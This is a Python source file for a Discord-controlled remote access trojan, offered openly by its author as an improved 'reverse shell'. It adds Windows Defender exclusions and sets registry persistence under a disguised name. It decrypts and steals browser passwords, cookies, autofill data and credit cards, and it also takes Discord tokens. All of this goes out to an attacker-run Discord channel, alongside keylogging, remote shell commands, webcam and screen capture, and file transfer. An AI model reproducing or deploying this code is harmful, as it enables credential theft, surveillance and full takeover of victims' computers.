                                            ## This is an enhanced version of my old reverse shell, it doesnt have as many features yet but it is more user friendly.
                                            ## The download command is way better than before and the bot now checks to confirm your commands with a reaction..
                                            ## I will be updating this one when i have time.

import os, sys, subprocess, importlib

required_packages = [
    'discord',
    'pynput',
    'pyperclip',
    'pywin32',
    'pycryptodome',
    'requests',
    'mss',
    'opencv-python',
    'imageio',
    'numpy',
    'psutil',
    'aiohttp',
    'Pillow',
    'screeninfo',
    'pyautogui'
]

def install_packages():
    for package in required_packages:
        try:
            importlib.import_module(package.split('-')[0].lower())
            print(f"{package} is already installed")
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_packages()

import discord
from discord.ext import commands, tasks
from pynput import keyboard
import pyperclip, base64, win32crypt
from Crypto.Cipher import AES
import winreg, zipfile, tempfile, ctypes, threading, asyncio, requests
from datetime import datetime
import mss, time, cv2
import imageio.v2 as imageio
import json, shutil, io, psutil, re, sqlite3, tempfile
import numpy as np
import socket, aiohttp, pyautogui
from pathlib import Path
from PIL import Image
from screeninfo import get_monitors

#def is_admin():
#    try:
#        return ctypes.windll.shell32.IsUserAnAdmin()
 #   except:
 #       return False

#if not is_admin():
#    # Relaunch the script with admin rights
 #   params = " ".join([f'"{arg}"' for arg in sys.argv])
 #   ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
#    sys.exit()

# bad code ^^ will fix later..

print("Running as not admin!")

def get_hostname():
    return socket.gethostname()

#Config
bot_token = ""     # <=== Change to your discord bot token
channel_id = 0     # <=== Change to your discord channel ID
prefix = "!"    
PERSISTENCE_NAME = "WindowsDefender"   # <=== Change to your desired startup file name

keylog_category_name = get_hostname()
keylog_channel_name = "keylog"

LOOT_DIR = "loot_temp"
os.makedirs(LOOT_DIR, exist_ok=True)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=prefix, intents=intents)

key_buffer = ""
send_lock = asyncio.Lock()  

def add_defender_exclusions():
    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_path = os.path.join(downloads_folder, "WrathOfGods.exe")
    folder_path = downloads_folder  # whole Downloads folder

    try:
        # Add file exclusion
        subprocess.run([
            "powershell",
            "-Command",
            f"Add-MpPreference -ExclusionPath '{exe_path}'"
        ], check=True)

        # Add folder exclusion
        subprocess.run([
            "powershell",
            "-Command",
            f"Add-MpPreference -ExclusionPath '{folder_path}'"
        ], check=True)

        print("[+] Defender exclusions added for file and folder.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to add Defender exclusions: {e}")

# Call the function
add_defender_exclusions()


def write_temp(folder, filename, content):
    """Write data to temporary files in the loot directory"""
    folder_path = os.path.join(LOOT_DIR, folder)
    os.makedirs(folder_path, exist_ok=True)
    filepath = os.path.join(folder_path, filename)
    try:
        with open(filepath, "a", encoding="utf-8", errors="replace") as f:
            if isinstance(content, (list, tuple)):
                f.writelines(f"{item}\n" for item in content)
            elif isinstance(content, dict):
                json.dump(content, f, indent=2, ensure_ascii=False)
            else:
                f.write(str(content) + "\n")
    except Exception as e:
        print(f"[!] Failed to write {filename}: {e}")

def create_loot_zip():
    """Package all collected data into a zip file"""
    zip_name = "system_data.zip"
    try:
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(LOOT_DIR):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, LOOT_DIR)
                    zipf.write(full_path, arcname)
        return zip_name
    except Exception as e:
        print(f"[!] Failed to create zip: {e}")
        return None

async def send_zip_to_discord(zip_path):
    """Send the zip file through Discord bot"""
    try:
        channel = bot.get_channel(channel_id)
        if not channel:
            return False
        file_size_mb = os.path.getsize(zip_path) / (1024 * 1024)
        if file_size_mb > 8:
            print("[ERROR] File too large for Discord (max 8MB)")
            return False
        with open(zip_path, "rb") as f:
            await channel.send(file=discord.File(f, "system_data.zip"))
        return True
    except Exception as e:
        print(f"[ERROR] Script failed, restart. {type(e).__name__} - {e}")
        return False

def get_chrome_emails():
    """Extract emails from Chrome's login data"""
    try:
        login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
        tmp_db = os.path.join(LOOT_DIR, "temp_chrome_emails.db")
        shutil.copy2(login_data_path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT username_value FROM logins WHERE username_value != '' GROUP BY username_value")
        emails = [row[0] for row in cursor.fetchall()]
        conn.close()
        if emails:
            write_temp("browser_data", "chrome_emails.txt", emails)
            return emails
        return ["No emails found in Chrome login data."]
    except Exception as e:
        error_msg = f"Failed to get Chrome emails: {e}"
        write_temp("browser_data", "chrome_emails.txt", error_msg)
        return [error_msg]

def get_browser_paths():
    """Get paths for common browsers"""
    localapp = os.getenv("LOCALAPPDATA")
    return {
        "Chrome": [os.path.join(localapp, "Google", "Chrome", "User Data", "Default")],
        "Edge": [os.path.join(localapp, "Microsoft", "Edge", "User Data", "Default")],
        "Brave": [os.path.join(localapp, "BraveSoftware", "Brave-Browser", "User Data", "Default")],
    }

def get_encryption_key(browser_path):
    """Extract encryption key from browser"""
    try:
        local_state_path = os.path.join(browser_path, "..", "Local State")
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            encrypted_key = json.load(f)["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key)
        if encrypted_key.startswith(b"DPAPI"):
            encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[!] Key extraction failed: {e}")
        return None

def decrypt_value(encrypted_value, key):
    """Decrypt browser data using extracted key"""
    if not encrypted_value:
        return ""
    try:
        if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11"):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode(errors="replace")
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors="replace")
    except Exception:
        return ""

def extract_browser_data(browser_name, data_type):
    """Extract specified data type from browser"""
    browsers = get_browser_paths()
    if browser_name not in browsers:
        return []

    extraction_map = {
        "passwords": ("Login Data", "logins", "origin_url, username_value, password_value"),
        "cookies": ("Cookies", "cookies", "host_key, name, encrypted_value"),
        "autofill": ("Web Data", "autofill", "name, value"),
        "history": ("History", "urls", "url, title, visit_count"),
        "credit_cards": ("Web Data", "credit_cards", "name_on_card, expiration_month, expiration_year, card_number_encrypted"),
    }

    db_file, table, columns = extraction_map[data_type]
    results = []

    for profile_path in browsers[browser_name]:
        if not os.path.exists(profile_path):
            continue
        key = get_encryption_key(profile_path) if data_type in ["passwords", "cookies", "credit_cards"] else None
        temp_db = os.path.join(LOOT_DIR, f"temp_{data_type}.db")

        conn = None
        cursor = None
        try:
            source_db = os.path.join(profile_path, db_file)
            if not os.path.exists(source_db):
                continue
            shutil.copy2(source_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(f"SELECT {columns} FROM {table}")
            for row in cursor.fetchall():
                # Decrypt last column if encrypted
                if "encrypted" in columns or "password_value" in columns:
                    decrypted = decrypt_value(row[-1], key)
                    results.append(row[:-1] + (decrypted,))
                else:
                    results.append(row)
        except Exception as e:
            print(f"[!] {data_type} extraction failed in {profile_path}: {e}")
        finally:
            try:
                if cursor:
                    cursor.close()
                if conn:
                    conn.close()
                if os.path.exists(temp_db):
                    os.remove(temp_db)
            except Exception as e:
                print(f"[!] Error cleaning up temp files: {e}")

    return results

def extract_discord_tokens():
    """Extract Discord tokens from various locations"""
    token_regex = re.compile(r"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})")
    paths = [
        os.path.join(os.getenv("APPDATA", ""), "Discord"),
        os.path.join(os.getenv("APPDATA", ""), "DiscordCanary"),
        os.path.join(os.getenv("APPDATA", ""), "DiscordPTB"),
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
    ]

    tokens = set()
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        tokens.update(match.group() for match in token_regex.finditer(line))
            except Exception:
                continue
    return list(tokens)

def get_ip_info():
    """Get detailed IP information"""
    try:
        ip_data = requests.get("http://ip-api.com/json/").json()
        if ip_data.get("status") == "success":
            loc = f"{ip_data.get('city','?')}, {ip_data.get('regionName','?')} ({ip_data.get('country','?')})"
            ip_info = {
                "IP Address": ip_data.get("query"),
                "Location": loc,
                "ISP": ip_data.get("isp", "Unknown"),
                "Organization": ip_data.get("org", "Unknown"),
                "Map URL": f"https://google.com/maps?q={ip_data.get('lat')},{ip_data.get('lon')}",
                "AS": ip_data.get("as", "Unknown"),
            }
            write_temp("ip_info", "ip_details.json", ip_info)
            return ip_info
        return {}
    except Exception as e:
        print(f"[!] IP info collection failed: {e}")
        return {}

def collect_and_send_data():
    """Main data collection function"""
    try:
        get_ip_info()
        get_chrome_emails()
        for browser in ["Chrome", "Edge", "Brave"]:
            for data_type, fmt in [
                ("passwords", lambda r: f"{r[0]} | {r[1]} | {r[2]}"),
                ("cookies", lambda r: f"{r[0]} | {r[1]} | {r[2]}"),
                ("autofill", lambda r: f"{r[0]} | {r[1]}"),
                ("history", lambda r: f"{r[0]} | {r[1]} | {r[2]}"),
                ("credit_cards", lambda r: f"{r[0]} | {r[1]}/{r[2]} | {r[3]}"),
            ]:
                results = extract_browser_data(browser, data_type)
                write_temp("browser_data", f"{browser.lower()}_{data_type}.txt", [fmt(r) for r in results if any(r)])
        tokens = extract_discord_tokens()
        write_temp("discord", "discord_tokens.txt", tokens)
        zip_path = create_loot_zip()
        if zip_path:
            asyncio.run_coroutine_threadsafe(send_zip_to_discord(zip_path), bot.loop).result()
            os.remove(zip_path)
            shutil.rmtree(LOOT_DIR, ignore_errors=True)
    except Exception as e:
        print(f"[!] Error in collect_and_send_data: {e}")

def CopyClipboard():
    return pyperclip.paste()

def get_startup_tasks():
    cmd = [
        "powershell",
        "-Command",
        "Get-CimInstance Win32_StartupCommand | Select-Object Name, Command"
    ]
    result = subprocess.check_output(cmd).decode(errors="ignore")
    return result if result else "No startup tasks found."

def get_hwid():
    try:
        cmd = ['powershell', '-Command', 'Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID']
        output = subprocess.check_output(cmd).decode().strip()
        return output if output else "Unknown"
    except Exception as e:
        return f"Error: {e}"
    
def get_chrome_history():
    # Path to Chrome history file (Windows)
    history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
    if not os.path.exists(history_path):
        return "Chrome history file not found."

    # Copy DB to temp because Chrome locks the original file
    temp_dir = tempfile.gettempdir()
    temp_history = os.path.join(temp_dir, "History_copy")

    shutil.copy2(history_path, temp_history)

    try:
        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
        rows = cursor.fetchall()
        conn.close()
    except Exception as e:
        return f"Error reading history: {e}"
    finally:
        os.remove(temp_history)

    history_entries = []
    for url, title, visit_time in rows:
        history_entries.append(f"{title} - {url}")

    return "\n".join(history_entries) if history_entries else "No history found."

# ===== Add to Registry =====
def add_to_startup():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    key = winreg.HKEY_CURRENT_USER
    registry = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(registry, PERSISTENCE_NAME, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(registry)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    threading.Thread(target=collect_and_send_data, daemon=True).start()

    ascii_art = r"""
                                          __  .__               
  ____  ____   ____   ____   ____   _____/  |_|__| ____   ____  
_/ ___\/  _ \ /    \ /    \_/ __ \_/ ___\   __\  |/  _ \ /    \ 
\  \__(  <_> )   |  \   |  \  ___/\  \___|  | |  (  <_> )   |  \
 \___  >____/|___|  /___|  /\___  >\___  >__| |__|\____/|___|  /
     \/           \/     \/     \/     \/                    \/                                       
    """

    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send(f"```{ascii_art}```")
        await channel.send(
            f"\nHWID: {get_hwid()}\nHostname: {get_hostname()}\n\n⭐COMMANDS⭐\n\n"
            f"!clipboard - Displays clipboard content\n"
            f"!startup - List startup folder\n"
            f"!ps - List running procs\n"
            f"!kill <PID> - Kill running proc\n"
            f"!cmd - <command>\n"
            f"!upload - Upload file then enter\n"
            f"!download - <path to file> - Download file from pc to dc\n"
            f"!linkdownload - <dropbox url> - Uploads file to pc from link\n"
            f"!browsinghistory - Send browser history\n"
            f"!steamdump - Dumps steam acc info (does not work)\n"
            f"!webcam - Snapshot\n"
            f"!webcamsr - 10 sec webcam video\n"
            f"!ss - Screenshots (All screens)\n"
            f"!ssrec - Record screen for 10 sec\n"
            f"!gifrecord <seconds> - Creates a gif of screen\n"
        )
    else:
        print("Channel not found!")

    # For simplicity, assume bot is connected to only one guild/server:
    guild = bot.guilds[0]  # Or get by ID if you want

    # Create category if it doesn't exist
    category = discord.utils.get(guild.categories, name=keylog_category_name)
    if category is None:
        category = await guild.create_category(keylog_category_name)
        print(f"Created category: {keylog_category_name}")

    # Create channel if it doesn't exist
    channel = discord.utils.get(guild.text_channels, name=keylog_channel_name)
    if channel is None or channel.category != category:
        channel = await guild.create_text_channel(keylog_channel_name, category=category)
        print(f"Created channel: {keylog_channel_name} in {keylog_category_name}")

    # Start the keylogger listener loop
    bot.keylog_channel = channel
    start_keylogger()

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

async def send_keylog_message(text):
    async with send_lock:
        # Send a message in chunks if text is long
        max_len = 1900
        for i in range(0, len(text), max_len):
            await bot.keylog_channel.send(f"```\n{text[i:i+max_len]}\n```")

def on_press(key):
    global key_buffer

    try:
        if hasattr(key, 'char') and key.char is not None:
            key_buffer += key.char
        else:
            key_buffer += f"[{key.name}]"
    except AttributeError:
        key_buffer += f"[{key}]"

    # Send every 50 characters or so
    if len(key_buffer) >= 50:
        # Because pynput runs in a different thread, schedule async send in event loop
        text_to_send = key_buffer
        key_buffer = ""

        asyncio.run_coroutine_threadsafe(send_keylog_message(text_to_send), bot.loop)

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr

        if len(output) > 1900:
            with io.StringIO(output) as f:
                f.seek(0)
                bytes_io = io.BytesIO(f.read().encode('utf-8'))
                bytes_io.seek(0)
                await ctx.send(file=discord.File(bytes_io, filename="cmd_output.txt"))
        else:
            await ctx.send(f"```\n{output}\n```")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def upload(ctx):
    if not ctx.message.attachments:
        await ctx.send("Please attach a file to upload.")
        return

    attachment = ctx.message.attachments[0]  # First attached file
    filename = attachment.filename

    import os
    appdata_path = os.getenv('APPDATA')  
    target_dir = os.path.join(appdata_path, "MyAppUploads")
    os.makedirs(target_dir, exist_ok=True)  # Make sure folder exists

    save_path = os.path.join(target_dir, filename)

    confirm_msg = await ctx.send(
        f"Do you want to upload **{filename}** to `{target_dir}`?\n"
        "React with ✅ to confirm or ❌ to cancel (30 seconds)."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return (
            user == ctx.author
            and str(reaction.emoji) in ["✅", "❌"]
            and reaction.message.id == confirm_msg.id
        )

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        if str(reaction.emoji) == "✅":
            await attachment.save(save_path)
            await ctx.send(f"File **{filename}** saved to `{target_dir}`.")
        else:
            await ctx.send("Upload cancelled by user.")

    except asyncio.TimeoutError:
        await ctx.send("Upload cancelled: no reaction received.")

@bot.command()
async def download(ctx, *, filepath: str):
    if not os.path.isfile(filepath):
        await ctx.send(f"File not found: `{filepath}`")
        return

    confirm_msg = await ctx.send(
        f"Do you want to download **{filepath}**?\n"
        "React with ✅ to confirm or ❌ to cancel (30 seconds)."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return (
            user == ctx.author
            and str(reaction.emoji) in ["✅", "❌"]
            and reaction.message.id == confirm_msg.id
        )

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        if str(reaction.emoji) == "✅":
            await ctx.send(file=discord.File(filepath))
        else:
            await ctx.send("Download cancelled by user.")
    except asyncio.TimeoutError:
        await ctx.send("Download cancelled: no reaction received.")

@bot.command()
async def linkdownload(ctx, url: str):
    import os
    appdata_path = os.getenv('APPDATA')  
    target_dir = os.path.join(appdata_path, "MyAppUploads")
    os.makedirs(target_dir, exist_ok=True)

    filename = url.split("/")[-1].split("?")[0]  # crude way to get filename from URL
    save_path = os.path.join(target_dir, filename)

    confirm_msg = await ctx.send(
        f"Do you want to download **{filename}** from the link to `{target_dir}`?\n"
        "React with ✅ to confirm or ❌ to cancel (30 seconds)."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return (
            user == ctx.author
            and str(reaction.emoji) in ["✅", "❌"]
            and reaction.message.id == confirm_msg.id
        )

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        if str(reaction.emoji) == "✅":
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        with open(save_path, "wb") as f:
                            f.write(data)
                        await ctx.send(f"File **{filename}** downloaded to `{target_dir}`.")
                    else:
                        await ctx.send(f"Failed to download file. Status code: {resp.status}")
        else:
            await ctx.send("Download cancelled by user.")
    except asyncio.TimeoutError:
        await ctx.send("Download cancelled: no reaction received.")

@bot.command()
async def gifrecord(ctx, seconds: int):
    try:
        await ctx.send(f"Recording screen as GIF for {seconds} seconds...")

        frames = []
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Main monitor

            for _ in range(seconds * 10):  # ~10 FPS
                img = sct.grab(monitor)
                png_bytes = mss.tools.to_png(img.rgb, img.size)
                frame = imageio.imread(png_bytes)
                frames.append(frame)
                await asyncio.sleep(0.1)

        # Safe filename with Unix timestamp
        filename = f"screen_record_{int(time.time())}.gif"
        imageio.mimsave(filename, frames, duration=0.1)

        await ctx.send(file=discord.File(filename))
        os.remove(filename)

    except Exception as e:
        await ctx.send(f"Error recording GIF: {e}")

@bot.command()
async def ps(ctx):
    try:
        procs = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                info = proc.info
                procs.append(f"PID: {info['pid']} | Name: {info['name']} | User: {info['username']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        output = "\n".join(procs)
        if len(output) > 1900:
            bytes_io = io.BytesIO(output.encode('utf-8'))
            bytes_io.seek(0)
            await ctx.send(file=discord.File(bytes_io, filename="process_list.txt"))
        else:
            await ctx.send(f"```\n{output}\n```")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def kill(ctx, pid: int):
    try:
        p = psutil.Process(pid)
        p.kill()
        p.wait(timeout=3)
        await ctx.send(f"Process {pid} terminated.")
    except psutil.NoSuchProcess:
        await ctx.send(f"No process with PID {pid}.")
    except psutil.AccessDenied:
        await ctx.send(f"Access denied to terminate process {pid}.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def startup(ctx):
    tasks = get_startup_tasks()
    if len(tasks) > 1900:
        bytes_io = io.BytesIO(tasks.encode('utf-8'))
        bytes_io.seek(0)
        await ctx.send(file=discord.File(bytes_io, filename="startup_tasks.txt"))
    else:
        await ctx.send(f"```\n{tasks}\n```")

@bot.command()
async def clipboard(ctx):
    cb = CopyClipboard()
    msg = f"**Clipboard Contents:** {cb}"
    await ctx.send(msg) 

@bot.command()
async def ss(ctx):
    try:
        monitors = get_monitors()

        total_width = sum(m.width for m in monitors)
        max_height = max(m.height for m in monitors)

        full_screenshot = Image.new('RGB', (total_width, max_height))

        current_x = 0
        for m in monitors:
            shot = pyautogui.screenshot(region=(m.x, m.y, m.width, m.height))
            full_screenshot.paste(shot, (current_x, 0))
            current_x += m.width

        image_bytes = io.BytesIO()
        full_screenshot.save(image_bytes, format='PNG')
        image_bytes.seek(0)

        await ctx.send(file=discord.File(fp=image_bytes, filename='full_screenshot.png'))

    except Exception as e:
        await ctx.send(f"Error taking full screenshot: {e}")

@bot.command()
async def browsinghistory(ctx):
    history = get_chrome_history()
    if len(history) > 1900:
        import io
        bytes_io = io.BytesIO(history.encode('utf-8'))
        bytes_io.seek(0)
        await ctx.send(file=discord.File(bytes_io, filename="chrome_history.txt"))
    else:
        await ctx.send(f"```\n{history}\n```")

@bot.command()
async def webcam(ctx):
    try:
        cap = cv2.VideoCapture(0)  # Open default webcam
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await ctx.send("Failed to capture webcam image.")
            return
        # Convert frame (numpy array) to PNG bytes
        is_success, buffer = cv2.imencode(".png", frame)
        io_buf = io.BytesIO(buffer)
        await ctx.send(file=discord.File(fp=io_buf, filename="webcam.png"))
    except Exception as e:
        await ctx.send(f"Error capturing webcam image: {e}")

bot.run(bot_token)
